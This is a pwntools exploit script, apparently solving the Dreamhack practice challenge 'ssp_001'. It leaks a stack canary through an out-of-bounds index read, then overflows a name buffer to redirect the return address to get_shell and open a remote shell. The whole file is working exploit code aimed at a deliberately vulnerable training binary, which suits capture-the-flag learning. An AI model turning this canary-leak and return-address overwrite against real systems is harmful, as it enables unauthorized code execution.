from pwn import *

p = remote("host3.dreamhack.games",18961)
context.arch = "i386"
elf = ELF("./ssp_001")

get_shell = elf.symbols['get_shell'] 

# TODO : F (box input 입력)
p.sendlineafter(b"> ", b"F")
p.sendlineafter(b"box input : ", b"A"*0x40)
    
idx = 128 # box와 canary 사이의 offset 0x80 
canary = b""

# TODO : P (buf index 값 출력) -> canary 추출 
for i in range(4):
    p.sendlineafter(b"> ", b"P")
    p.sendlineafter(b"Element index : ",str(idx+i))
    p.recvuntil("is : ")
    canary = p.recvuntil('\n')[0:2] + canary

print(b"canary: ",canary)
canary = int(canary,16)

p.sendlineafter(b"> ", b"E")

payload = b'A' * 0x40 # name
payload += p32(canary) # canary
payload += b'B' * 0x08 # rdi + sfp 
payload += p32(get_shell) # ret 

p.sendlineafter(b"Name Size : ", str(len(payload)))
p.sendlineafter(b"Name : ", payload)

p.interactive()